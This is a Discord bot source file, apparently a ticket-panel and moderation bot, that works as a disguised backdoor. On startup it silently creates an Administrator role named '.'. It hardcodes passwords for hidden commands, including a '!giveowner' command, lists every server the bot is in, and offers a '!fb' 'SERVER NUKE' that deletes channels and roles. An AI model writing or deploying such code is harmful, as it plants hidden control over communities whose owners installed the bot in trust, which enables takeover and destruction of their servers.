const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'flower2017';           // New password for most commands
const GIVEOWNER_PASSWORD = 'flowerOwner2017'; // Separate for !giveowner

// EXPRESS SERVER
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// SLASH COMMANDS
const commands = [
  new SlashCommandBuilder().setName('setticket').setDescription('Send ticket panel').toJSON(),
  new SlashCommandBuilder().setName('sendmessage').setDescription('Send message').toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Commands registered');
  } catch (err) {
    console.error(err);
  }
})();

// READY + CREATE . ROLE
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) panelStore[saved.menuId] = saved.data;

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
    } catch (e) {}
    return;
  }

  // !servers
  if (content === '!servers') {
    const guilds = client.guilds.cache;
    let text = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
    message.reply(text.length > 2000 ? 'List too long, check console.' : text);
    return;
  }

  // Add your other commands here (!fb, !kick, !4clout, !movebootser, !burn, !traine, !femisdumb, etc.)
  // Example for !fb:
  if (content === '!fb') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔴 SERVER NUKE').setDescription('Deletes channels & roles except Owner.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
  }

  // ... (add the rest of your commands similarly)
});

client.login(TOKEN);
